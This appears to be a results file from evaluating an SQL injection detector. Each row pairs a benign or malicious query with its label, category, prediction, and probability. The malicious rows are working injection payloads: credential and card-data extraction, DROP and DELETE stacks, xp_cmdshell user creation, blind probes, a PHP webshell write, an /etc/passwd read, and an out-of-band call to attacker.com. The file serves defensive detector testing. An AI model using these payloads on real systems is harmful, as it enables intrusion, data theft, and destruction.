query,label,category,description,predicted,correct,malicious_probability
"INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');",0,insert,Simple insert,1,False,0.8283650994493457
"INSERT INTO orders (user_id, total, status) VALUES (1, 99.99, 'pending');",0,insert,Insert with values,0,True,0.1522006464779481
UPDATE users SET status = 'inactive' WHERE id = 5;,0,update,Simple update,0,True,0.02739931942086744
UPDATE products SET price = 29.99 WHERE id = 100;,0,update,Price update,0,True,0.007830748052089885
UPDATE orders SET status = 'shipped' WHERE id = 42;,0,update,Status update,0,True,0.01136449582723373
DELETE FROM sessions WHERE expired_at < NOW();,0,delete,Delete expired,0,True,0.37701770853403976
DELETE FROM cart_items WHERE cart_id = 15;,0,delete,Delete by ID,0,True,0.020705800064199267
SELECT 1;,0,minimal,Minimal query,1,False,0.9198939811796997
SELECT NOW();,0,minimal,Get current time,1,False,0.9898983365331978
SELECT VERSION();,0,minimal,Version check,1,False,0.9863931594236675
SELECT DATABASE();,0,minimal,Database name,1,False,0.9959482883402673
SELECT * FROM users WHERE id = 1 AND 1=1;,0,edge_case,Looks suspicious but benign - valid AND,1,False,0.9994484226790459
SELECT * FROM products WHERE name = 'OR Gate Circuit Board';,0,edge_case,Product name contains OR,0,True,0.06867894532575321
SELECT * FROM products WHERE name = 'SELECT All Items Bundle';,0,edge_case,Product name contains SELECT,0,True,0.02371091760389373
SELECT * FROM products WHERE sku = 'UNION-JACK-FLAG-001';,0,edge_case,SKU contains UNION,1,False,0.8276330635195566
SELECT * FROM tickets WHERE subject = 'Help -- urgent issue';,0,edge_case,Comment-like in string,0,True,0.4305006602026271
SELECT * FROM reviews WHERE text = 'It''s the best product!';,0,edge_case,Escaped quote,0,True,0.05831689188752645
SELECT * FROM users WHERE name = 'O''Brien';,0,edge_case,Irish name with quote,0,True,0.041303443988183176
SELECT * FROM users WHERE bio = 'I love coding -- especially SQL!';,0,edge_case,Double dash in content,1,False,0.8696300277810721
SELECT * FROM products WHERE description LIKE '%1=1%';,0,edge_case,Contains 1=1 in string,0,True,0.27542779589169863
SELECT * FROM comments WHERE content = 'DROP everything and buy this!';,0,edge_case,Contains DROP,1,False,0.9880013289223037
SELECT * FROM users WHERE id = 1 OR id = 2 OR id = 3;,0,edge_case,Multiple OR (valid),1,False,0.9905780165358307
SELECT * FROM users WHERE status = 'active' -- this is a comment;,0,edge_case,Valid SQL comment,1,False,0.9975561419762814
SELECT * FROM products WHERE category = 'Sleep & Bedding';,0,edge_case,Ampersand in value,0,True,0.029282452466054175
"SELECT u.*, (SELECT COUNT(*) FROM orders WHERE user_id = u.id) FROM users u;",0,subquery,Correlated subquery,0,True,0.08366866663408351
SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 100);,0,subquery,Subquery in IN,0,True,0.02334333882691784
SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products);,0,subquery,Subquery comparison,0,True,0.014314550065005475
' OR '1'='1,1,tautology,Classic tautology,1,True,0.9999999999999984
' OR 1=1--,1,tautology,Tautology with comment,1,True,1.0
' OR 1=1#,1,tautology,Tautology with hash comment,1,True,0.9999999999999991
' OR 'x'='x,1,tautology,String tautology,1,True,0.9999999999875204
' OR ''=',1,tautology,Empty string tautology,1,True,0.9999999999994182
1' OR '1'='1,1,tautology,Numeric prefix tautology,1,True,0.9999999999999953
admin'--,1,tautology,Username bypass,1,True,0.9999999999992837
admin' --,1,tautology,Username bypass with space,1,True,0.9999999999993423
admin'#,1,tautology,Username bypass hash,1,True,0.9999999999970328
' OR 1=1 OR ',1,tautology,Double OR tautology,1,True,0.9999999999999996
') OR ('1'='1,1,tautology,Parenthesis tautology,1,True,0.9999999999078897
') OR 1=1--,1,tautology,Parenthesis tautology comment,1,True,0.9999999999999998
' OR 1=1/*,1,tautology,Block comment,1,True,0.9999999999999898
1 OR 1=1,1,tautology,Simple numeric OR,1,True,0.9999999999999993
' OR 'a'='a,1,tautology,Letter tautology,1,True,0.9999999999991722
SELECT * FROM users WHERE id = 1 OR 1=1;,1,tautology_full,Full query with tautology,1,True,0.999999638720509
SELECT * FROM users WHERE username = 'admin' OR '1'='1';,1,tautology_full,Full query string tautology,1,True,0.9999999999721172
SELECT * FROM users WHERE id = '' OR 1=1 -- '';,1,tautology_full,Empty string with tautology,1,True,0.9999999996191247
' UNION SELECT NULL--,1,union,Basic UNION probe,1,True,0.999999999884837
"' UNION SELECT NULL,NULL--",1,union,Two column UNION,1,True,0.9999999993603395
"' UNION SELECT NULL,NULL,NULL--",1,union,Three column UNION,1,True,0.9999999928253454
"' UNION SELECT 1,2,3--",1,union,Numeric UNION,1,True,0.9999999996106592
"' UNION SELECT 1,2,3,4,5--",1,union,Five column UNION,1,True,0.9999999866467439
"' UNION SELECT username,password FROM users--",1,union,Credential extraction,1,True,0.9999999095847234
' UNION SELECT @@version--,1,union,Version extraction,1,True,0.9999999973879055
"' UNION ALL SELECT 1,2,3--",1,union,UNION ALL,1,True,0.9999999712721993
' UNION SELECT table_name FROM information_schema.tables--,1,union,Schema extraction,1,True,0.9999921915575641
' UNION SELECT column_name FROM information_schema.columns--,1,union,Column extraction,1,True,0.9999951744593899
"' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",1,union,Credential concat,1,True,0.9999999815452011
"' UNION SELECT 1,user(),database()--",1,union,Function extraction,1,True,0.9999999337250476
1' UNION SELECT * FROM users--,1,union,Full table extraction,1,True,0.9999999979350254
"' UNION SELECT credit_card,cvv,expiry FROM payments--",1,union,Sensitive data extraction,1,True,0.9998750733235147
"SELECT * FROM users WHERE id = 1 UNION SELECT username,password,null FROM admins--",1,union_full,Full UNION injection,1,True,0.9999998022561891
"SELECT * FROM products WHERE id = '' UNION SELECT 1,2,3,4,5--",1,union_full,Full UNION with columns,1,True,0.9999894776574602
'; DROP TABLE users--,1,stacked,Drop table,1,True,0.9999999961521253
'; DROP TABLE orders--,1,stacked,Drop table,1,True,0.9999999917489707
'; DROP DATABASE production--,1,stacked,Drop database,1,True,0.9999826194959208
'; DELETE FROM users--,1,stacked,Delete all users,1,True,0.9999994695958945
'; DELETE FROM users WHERE 1=1--,1,stacked,Delete with tautology,1,True,0.9999999907547409
'; TRUNCATE TABLE sessions--,1,stacked,Truncate table,1,True,0.9999993703451323
"'; INSERT INTO users VALUES('hacker','hacked@evil.com','admin')--",1,stacked,Insert admin,1,True,0.9999999890418371
'; UPDATE users SET password='hacked' WHERE username='admin'--,1,stacked,Update password,1,True,0.9999999975757203
'; UPDATE users SET role='admin' WHERE id=5--,1,stacked,Privilege escalation,1,True,0.9999998118358812
1; DROP TABLE products--,1,stacked,Numeric prefix drop,1,True,0.9999997024219662
'; EXEC xp_cmdshell('dir')--,1,stacked,Command execution,1,True,0.9999997242275155
'; EXEC xp_cmdshell('net user hacker password /add')--,1,stacked,Add user command,1,True,0.9999994315597724
'; SHUTDOWN--,1,stacked,Shutdown database,1,True,0.9999999741268175
'; ALTER TABLE users ADD hacked INT--,1,stacked,Alter table,1,True,0.9999998929054424
'; CREATE TABLE backdoor(cmd TEXT)--,1,stacked,Create backdoor table,1,True,0.9999995706071435
' AND SLEEP(5)--,1,time_blind,Time-based blind,1,True,0.9999999995587956
' AND SLEEP(10)--,1,time_blind,Time-based blind 10s,1,True,0.9999999374656355
1' AND SLEEP(5)--,1,time_blind,Numeric time blind,1,True,0.9999999997397293
' OR SLEEP(5)--,1,time_blind,OR time blind,1,True,0.9999999997749205
'; WAITFOR DELAY '0:0:5'--,1,time_blind,MSSQL waitfor,1,True,0.9999988831668317
'; WAITFOR DELAY '0:0:10'--,1,time_blind,MSSQL waitfor 10s,1,True,0.9999986960654168
"' AND BENCHMARK(10000000,SHA1('test'))--",1,time_blind,MySQL benchmark,1,True,0.9999657276050251
' AND (SELECT SLEEP(5))--,1,time_blind,Subquery sleep,1,True,0.9999999835166069
"1' AND IF(1=1,SLEEP(5),0)--",1,time_blind,Conditional sleep,1,True,0.9999999689159077
"' OR IF(1=1,SLEEP(5),0)--",1,time_blind,OR conditional sleep,1,True,0.9999999894886936
' AND pg_sleep(5)--,1,time_blind,PostgreSQL sleep,1,True,0.9999996492073049
'; SELECT pg_sleep(5)--,1,time_blind,PostgreSQL sleep stacked,1,True,0.9999996894159003
' AND 1=1--,1,boolean_blind,Boolean true,1,True,0.9999999999999263
' AND 1=2--,1,boolean_blind,Boolean false,1,True,0.9999999963043114
' AND 'a'='a'--,1,boolean_blind,String boolean true,1,True,0.9999999995362638
' AND 'a'='b'--,1,boolean_blind,String boolean false,1,True,0.9999999973042781
"' AND SUBSTRING(@@version,1,1)='5'--",1,boolean_blind,Version probe,1,True,0.9999995424361134
"' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",1,boolean_blind,ASCII extraction,1,True,0.9999958078234796
' AND (SELECT COUNT(*) FROM users)>0--,1,boolean_blind,Count probe,1,True,0.9999878180832783
' AND LENGTH(database())>5--,1,boolean_blind,Database length probe,1,True,0.9999942340668838
"' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>50--",1,boolean_blind,Password extraction,1,True,0.9999794154206904
1' AND 1=1 AND '1'='1,1,boolean_blind,Nested boolean,1,True,0.9999999999986127
' AND EXISTS(SELECT * FROM users)--,1,boolean_blind,EXISTS probe,1,True,0.9999988664670904
' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--,1,boolean_blind,Password char probe,1,True,0.9999999826126559
"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",1,error_based,ExtractValue,1,True,0.9999989298028726
"' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",1,error_based,UpdateXML,1,True,0.9999982792705937
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Double query,1,True,0.9999953900656117
"' AND GTID_SUBSET(@@version,1)--",1,error_based,GTID subset,1,True,0.9999947199171015
' AND EXP(~(SELECT * FROM (SELECT @@version)a))--,1,error_based,Exp overflow,1,True,0.9999976667608305
' ORDER BY 1--,1,error_based,Order by probe,1,True,0.9999999964178032
' ORDER BY 10--,1,error_based,Order by column count,1,True,0.9999999812520496
' ORDER BY 100--,1,error_based,Order by overflow,1,True,0.9999999852527577
' HAVING 1=1--,1,error_based,Having clause,1,True,0.9999999904148354
' GROUP BY columnname HAVING 1=1--,1,error_based,Group by having,1,True,0.9999991507373895
' oR '1'='1,1,obfuscated_case,Mixed case OR,1,True,0.9999999998026152
' Or 1=1--,1,obfuscated_case,Mixed case Or,1,True,0.9999999997012334
' uNiOn SeLeCt NuLl--,1,obfuscated_case,Mixed case UNION SELECT,1,True,0.9999905288968856
"' UnIoN sElEcT 1,2,3--",1,obfuscated_case,Alternating case,1,True,0.9999968436864622
' aNd SlEeP(5)--,1,obfuscated_case,Mixed case AND SLEEP,1,True,0.9999982351810925
'; dRoP tAbLe UsErS--,1,obfuscated_case,Mixed case DROP TABLE,1,True,0.9999924175853766
'  OR   '1'='1,1,obfuscated_whitespace,Extra spaces,1,True,0.9999999999999984
'	OR	1=1--,1,obfuscated_whitespace,Tab characters,1,True,0.9999999999996325
' \t OR \t 1=1--,1,obfuscated_whitespace,Mixed whitespace,1,True,0.9999999999999432
'  UNION  SELECT  NULL--,1,obfuscated_whitespace,Spaced UNION,1,True,0.999999999884837
"'		UNION		SELECT		1,2,3--",1,obfuscated_whitespace,Tab UNION,1,True,0.9999999996106592
'/**/OR/**/1=1--,1,obfuscated_comment,Inline comment OR,1,True,0.9999999999998348
'/*x*/OR/*y*/'1'='1,1,obfuscated_comment,Named comments,1,True,0.9999999797875501
' /*!OR*/ 1=1--,1,obfuscated_comment,MySQL version comment,1,True,0.9999999919870067
'/**/UNION/**/SELECT/**/NULL--,1,obfuscated_comment,Comment UNION,1,True,0.9999999997677749
"'/*abc*/UNION/*def*/SELECT/*ghi*/1,2,3--",1,obfuscated_comment,Multi comment,1,True,0.9999977277180111
' /*!50000OR*/ 1=1--,1,obfuscated_comment,Version conditional,1,True,0.9999999518897985
admin'/**/--,1,obfuscated_comment,Comment bypass,1,True,0.9999999999989408
' OR 'a'||'b'='ab,1,obfuscated_concat,Concat Oracle,1,True,0.9999999928393026
"' OR CONCAT('1','1')='11",1,obfuscated_concat,MySQL concat,1,True,0.9999999662261527
' OR CHR(49)||CHR(61)||CHR(49)--,1,obfuscated_concat,Chr concat,1,True,0.999957955262434
' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--,1,obfuscated_concat,CHAR concat,1,True,0.9999639682787835
' OR 0x31=0x31--,1,obfuscated_encoded,Hex encoded,1,True,0.9999992815583064
' UNION SELECT 0x61646d696e--,1,obfuscated_encoded,Hex string,1,True,0.999998091441751
' %4fR 1=1--,1,obfuscated_encoded,URL encoded O,1,True,0.9999999999014342
' OR%201=1--,1,obfuscated_encoded,URL encoded space,1,True,0.9999999893971231
'%27 OR 1=1--,1,obfuscated_encoded,URL encoded quote,1,True,0.9999999999996745
' %55NION %53ELECT NULL--,1,obfuscated_encoded,URL encoded keywords,1,True,0.9999972127870337
admin%27--,1,obfuscated_encoded,URL encoded username,1,True,0.9999999930803329
SELECT * FROM users WHERE id = '1' OR '1'='1',1,full_injection_select,Full SELECT injection,1,True,0.9999999990532049
SELECT * FROM users WHERE username = '' OR 1=1--',1,full_injection_select,Full username bypass,1,True,0.9999999994515016
"SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5--",1,full_injection_select,Full UNION attack,1,True,0.9999676677246939
SELECT * FROM users WHERE email = 'test@x.com' AND SLEEP(5)--',1,full_injection_select,Full time attack,1,True,0.9999991275032952
SELECT * FROM orders WHERE id = 1; DROP TABLE orders;--,1,full_injection_select,Full stacked attack,1,True,0.9987928738315973
INSERT INTO users (name) VALUES ('test' OR '1'='1');,1,full_injection_insert,Insert injection,1,True,0.9999999927729062
INSERT INTO logs (data) VALUES (''; DROP TABLE logs;--');,1,full_injection_insert,Insert stacked,1,True,0.9999992781960004
UPDATE users SET name = '' OR '1'='1' WHERE id = 1;,1,full_injection_update,Update injection,1,True,0.9999999754149541
UPDATE products SET price = 0 WHERE id = 1 OR 1=1;,1,full_injection_update,Update tautology,1,True,0.9997889933103045
DELETE FROM users WHERE id = 1 OR 1=1;,1,full_injection_delete,Delete tautology,1,True,0.9999999518477133
DELETE FROM sessions WHERE id = '' OR '1'='1';,1,full_injection_delete,Delete injection,1,True,0.9999999974722789
' UNION SELECT load_file('/etc/passwd')--,1,advanced,File read,1,True,0.9999999943902926
' UNION SELECT * INTO OUTFILE '/tmp/hack.txt'--,1,advanced,File write,1,True,0.9999999985211507
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE hack--,1,advanced,Load file,1,True,0.9999998213864009
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--,1,advanced,Webshell upload,1,True,0.9999998300539925
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,advanced,Nested sleep,1,True,0.9999995808395364
"' AND (SELECT count(*) FROM generate_series(1,10000000))--",1,advanced,PostgreSQL DoS,1,True,0.999654015051496
"' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",1,advanced,Complex error based,1,True,0.9999996664964181
'; DECLARE @q VARCHAR(8000);SET @q='\\\\attacker.com\\share';EXEC master..xp_dirtree @q--,1,advanced,MSSQL out-of-band,1,True,0.9999321393096159
"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY X)y)--",1,advanced,Double query complex,1,True,0.999995844194509
' AND LOAD_EXTENSION('/path/to/evil.so')--,1,advanced,Extension loading,1,True,0.9999967844270985
SELECT * FROM users WHERE user_id = $user_input;,0,placeholder,Application placeholder,0,True,0.006093342001228179
SELECT * FROM products WHERE category = ?;,0,placeholder,Prepared statement marker,0,True,0.001493536910686774
SELECT * FROM orders WHERE id = :order_id;,0,placeholder,Named parameter,0,True,0.001398165748941926
SELECT * FROM users WHERE created_at >= CURRENT_DATE - INTERVAL 30 DAY;,0,complex_benign,Interval calculation,0,True,0.10449212203045717
SELECT * FROM products WHERE price * 1.1 < 100;,0,complex_benign,Expression in WHERE,0,True,0.004364663975142683
"SELECT COALESCE(nickname, username, 'Anonymous') FROM users;",0,complex_benign,COALESCE function,0,True,0.3376688823847141
SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users;,0,complex_benign,CASE expression,1,False,0.7480421671427795
SELECT * FROM users WHERE email REGEXP '^[a-zA-Z0-9]+@';,0,complex_benign,REGEXP pattern,0,True,0.3136911140727858
"SELECT GREATEST(price, min_price) FROM products;",0,complex_benign,GREATEST function,0,True,0.053994624083522895
"SELECT * FROM products WHERE MATCH(name, description) AGAINST('laptop');",0,complex_benign,Full text search,0,True,0.06711704857080131
WITH cte AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM cte;,0,complex_benign,CTE query,0,True,0.23008965070446533
SELECT * FROM users u WHERE u.id = ANY(SELECT user_id FROM orders);,0,complex_benign,ANY subquery,0,True,0.027143991883027088
SELECT * FROM products FOR UPDATE;,0,complex_benign,SELECT FOR UPDATE,0,True,0.45819139597788533
"SELECT GET_LOCK('my_lock', 10);",0,complex_benign,Get lock function,1,False,0.869526908292551
EXPLAIN SELECT * FROM users WHERE id = 1;,0,complex_benign,EXPLAIN query,1,False,0.7550823891000309
SHOW TABLES;,0,complex_benign,Show tables,1,False,0.9999956102332348
DESCRIBE users;,0,complex_benign,Describe table,0,True,0.2216699052602853
SHOW CREATE TABLE users;,0,complex_benign,Show create,1,False,0.9998926755109311
SELECT * FROM inventory;,0,simple_select,Basic table scan,0,True,0.05563585331808368
SELECT * FROM payments;,0,simple_select,Basic table scan,0,True,0.0060280549845910985
SELECT * FROM reviews;,0,simple_select,Basic table scan,0,True,0.0013325912188443157
SELECT * FROM categories;,0,simple_select,Basic table scan,0,True,0.003911805601125287
SELECT * FROM shipping;,0,simple_select,Basic table scan,0,True,0.08028790696235122
SELECT * FROM addresses;,0,simple_select,Basic table scan,0,True,0.0027454130940637272
SELECT * FROM coupons;,0,simple_select,Basic table scan,0,True,0.00124776764713655
SELECT * FROM wishlist;,0,simple_select,Basic table scan,0,True,0.06861569463004587
SELECT * FROM cart;,0,simple_select,Basic table scan,0,True,0.020819438515358748
SELECT * FROM notifications;,0,simple_select,Basic table scan,0,True,0.003648874135667004
SELECT id FROM users;,0,simple_select,Single column,0,True,0.002686711067748515
SELECT email FROM users;,0,simple_select,Single column,0,True,0.0071799759419790615
"SELECT name, price, stock FROM products;",0,simple_select,Multiple columns,0,True,0.0014667416788007163
"SELECT first_name, last_name, email, phone FROM customers;",0,simple_select,Customer columns,0,True,0.008088412812985151
"SELECT order_id, total, created_at FROM orders WHERE user_id = 5;",0,simple_where,User orders,0,True,0.00044431992518345116
SELECT * FROM products WHERE stock > 0;,0,simple_where,In stock products,0,True,0.007061188007144399
SELECT * FROM users WHERE last_login IS NOT NULL;,0,simple_where,Active users,1,False,0.8364561563058064
SELECT * FROM orders WHERE shipped_at IS NULL;,0,simple_where,Pending orders,0,True,0.12739766711667724
SELECT * FROM products WHERE name = 'MacBook Pro';,0,simple_where,Product by name,0,True,0.04248978384885928
SELECT * FROM users WHERE phone = '+1-555-123-4567';,0,simple_where,Phone lookup,0,True,0.15789974972558157
SELECT * FROM products WHERE sku = 'ABC-12345';,0,simple_where,SKU lookup,0,True,0.03297582113484526
SELECT * FROM orders WHERE tracking_number = 'TRK123456789';,0,simple_where,Tracking lookup,0,True,0.06802504174788646
SELECT COUNT(DISTINCT category_id) FROM products;,0,aggregate,Distinct count,0,True,0.02454375920905465
SELECT SUM(quantity * price) FROM order_items WHERE order_id = 100;,0,aggregate,Order total,0,True,0.005967631525497846
"SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = 50;",0,aggregate,Product rating,0,True,0.009017061992664764
"SELECT MAX(total), MIN(total) FROM orders;",0,aggregate,Order range,0,True,0.024417301858057645
"SELECT COUNT(*) FROM users WHERE created_at > DATE_SUB(NOW(), INTERVAL 7 DAY);",0,aggregate,Recent users,0,True,0.21890667023288868
SELECT * FROM products ORDER BY created_at DESC LIMIT 10;,0,order_limit,Newest products,0,True,0.08579794322740837
SELECT * FROM orders ORDER BY total DESC LIMIT 5;,0,order_limit,Top orders,0,True,0.41988636068051216
SELECT * FROM users ORDER BY last_login DESC LIMIT 100;,0,order_limit,Recent logins,1,False,0.6714443823800997
SELECT * FROM products ORDER BY stock ASC LIMIT 20;,0,order_limit,Low stock,0,True,0.4140167053672891
SELECT * FROM products LIMIT 50 OFFSET 100;,0,pagination,Pagination query,0,True,5.063658109176677e-05
SELECT * FROM users LIMIT 25 OFFSET 75;,0,pagination,Pagination query,0,True,0.00017484627232310895
SELECT * FROM orders LIMIT 10 OFFSET 0;,0,pagination,First page,0,True,5.1664261142994875e-05
SELECT DISTINCT brand FROM products;,0,distinct,Distinct brands,0,True,0.049835256515276184
"SELECT DISTINCT city, country FROM addresses;",0,distinct,Distinct locations,0,True,0.03085555018041789
SELECT DISTINCT payment_method FROM payments;,0,distinct,Payment methods,0,True,0.10809820983588443
SELECT * FROM orders WHERE created_at >= '2024-06-01' AND created_at < '2024-07-01';,0,date_compare,Month range,0,True,0.09640004852920622
SELECT * FROM users WHERE birthday BETWEEN '1990-01-01' AND '1999-12-31';,0,date_compare,Birth year range,1,False,0.9559803218421572
SELECT * FROM sessions WHERE expires_at > NOW();,0,date_compare,Valid sessions,0,True,0.08536440661490947
SELECT * FROM coupons WHERE valid_until >= CURDATE();,0,date_compare,Active coupons,0,True,0.028973124693616993
SELECT * FROM products WHERE price >= 10 AND price <= 50;,0,numeric_compare,Price range,0,True,0.007056053082049939
SELECT * FROM orders WHERE item_count > 5;,0,numeric_compare,Large orders,0,True,0.001994529190341229
SELECT * FROM users WHERE login_count >= 100;,0,numeric_compare,Power users,0,True,0.0054847575384429125
SELECT * FROM products WHERE rating >= 4.5;,0,numeric_compare,Top rated,0,True,0.007919606222794532
"SELECT * FROM products WHERE category_id NOT IN (1, 2, 3);",0,in_clause,NOT IN,0,True,0.011200125428280847
"SELECT * FROM users WHERE role IN ('admin', 'moderator', 'editor');",0,in_clause,Role check,1,False,0.9996907333896142
"SELECT * FROM orders WHERE payment_status IN ('completed', 'refunded');",0,in_clause,Payment status,0,True,0.059027418042661046
"SELECT * FROM products WHERE color IN ('red', 'blue', 'green', 'black', 'white');",0,in_clause,Color filter,0,True,0.09518481266090463
SELECT * FROM users WHERE middle_name IS NULL;,0,null_check,Null middle name,1,False,0.8646229901740055
SELECT * FROM products WHERE discount_price IS NOT NULL;,0,null_check,Has discount,0,True,0.24205774877676547
SELECT * FROM orders WHERE cancelled_at IS NOT NULL;,0,null_check,Cancelled orders,0,True,0.36308487455694893
SELECT * FROM users WHERE status = 'active' AND email_verified = 1 AND phone_verified = 1;,0,multi_condition,Triple AND,0,True,0.31512099161396545
SELECT * FROM products WHERE (category_id = 5 OR category_id = 6) AND is_active = 1;,0,multi_condition,Mixed conditions,0,True,0.04469787355398935
